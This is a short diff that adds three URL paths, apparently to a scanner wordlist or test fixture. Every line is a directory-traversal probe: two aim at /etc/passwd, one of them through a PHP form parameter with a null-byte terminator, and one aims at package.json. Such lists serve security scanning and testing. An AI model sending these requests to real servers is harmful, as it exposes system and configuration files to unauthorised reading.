@@ -1,0 +1,3 @@
+/contrib/acog/print_form.php?formname=../../../etc/passwd%00
+/umweb/../etc/passwd
+/../package.json
